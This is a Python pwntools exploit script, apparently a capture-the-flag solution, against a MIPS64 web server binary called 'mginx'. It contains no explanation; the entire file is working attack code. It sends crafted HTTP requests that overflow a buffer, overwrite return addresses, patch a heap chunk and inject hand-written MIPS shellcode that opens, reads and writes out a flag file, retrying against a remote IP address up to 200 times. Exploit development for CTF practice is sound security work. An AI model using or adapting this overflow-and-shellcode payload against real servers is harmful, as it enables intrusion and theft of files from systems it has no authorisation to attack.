#python exp.py REMOTE=124.156.129.96 DEBUG
from pwn import *
import sys

context.update(arch='mips',bits=64,endian="big")

def main(host,port=8888):
    global p
    if host:
        p = remote(host,port)
    else:
        # p = process(["qemu-mips64","-g","1234","./mginx"])
        p = process(["qemu-mips64","./mginx"])
        # gdb.attach(p)
        #
    req = """GET /index \r
Connection: no\r
Content-Length: 4095
\r\n\r
"""
    req = req.ljust(0xf0,"A")
    # pause()
    p.send(req)
    # pause()
    # orw
    sc = "\x3c\x0d\x2f\x66\x35\xad\x6c\x61\xaf\xad\xff\xf8\x3c\x0d\x67\x00\xaf\xad\xff\xfc\x67\xa4\xff\xf8\x34\x05\xff\xff\x00\xa0\x28\x2a\x34\x02\x13\x8a\x01\x01\x01\x0c"
    sc += "\x00\x40\x20\x25\x24\x06\x01\x00\x67\xa5\xff\x00\x34\x02\x13\x88\x01\x01\x01\x0c"
    sc += "\x24\x04\x00\x01\x34\x02\x13\x89\x01\x01\x01\x0c"

    payload = "A"*0xf30
    payload += p64(0x000000012001a250)+p64(0x000000120012400)
    # remain 0x179 byte

    payload += p64(0x1200018c4)+"D"*(0x179-8)
    p.send(payload)
    p.recvuntil("404 Not Found :(",timeout=1)

    # pause()


    req = """GET /index \r
Connection: no\r
Content-Length: 4095
\r\n\r
"""
    req = req.ljust(0xf0,"\x00")
    p.send(req)
    # pause()
    payload = "\x00"*0xa88
    # fix the chunk
    payload += p64(0) + p64(21)
    payload += "\x00"*(0xf40-0xa98)
    # remain 0x179 byte

    payload += p64(0x00000001200134c0)
    payload += "\x00"*0x20+sc+"\x00"*(0x179-0x28-len(sc))

    p.send(payload)
    try:
        p.recvuntil("404 Not Found :(",timeout=1)
        flag = p.recvuntil("}",timeout=1)
        if flag != '' :
            info(flag)
            pause()
    except:
        p.close()
        return
    p.close()

if __name__ == "__main__":
    for i in range(200):
        try:
            main(args['REMOTE'])
        except:
            continue           

